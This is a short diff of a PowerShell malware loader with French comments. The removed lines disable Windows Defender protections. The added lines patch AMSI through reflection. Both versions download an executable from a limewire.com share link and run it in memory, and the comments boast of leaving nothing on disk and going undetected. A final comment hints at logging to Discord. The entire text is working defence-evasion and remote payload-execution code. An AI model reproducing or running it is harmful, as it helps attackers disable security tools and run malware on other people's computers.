@@ -1,9 +1,10 @@
-# Bypass AMSI + Cloud Protection (ligne magique 2025 qui marche partout)
-powershell -c "Set-MpPreference -DisableRealtimeMonitoring $true -SubmitSamplesConsent Never -MAPSReporting Disabled -PUAProtection Disabled" 2>$null
+# Bypass AMSI propre (la ligne qui marche partout en 2025)
+$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
+$a.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 
 # Exécute ton exe en mémoire (0 disque, 0 détection)
 $bytes = (New-Object Net.WebClient).DownloadData('https://limewire.com/d/e7ZYI#KTxZOpKpll')
-$asm = [System.Reflection.Assembly]::Load($bytes)
+$asm = [Reflection.Assembly]::Load($bytes)
 $asm.EntryPoint.Invoke($null,$null)
 
 # Log Discord
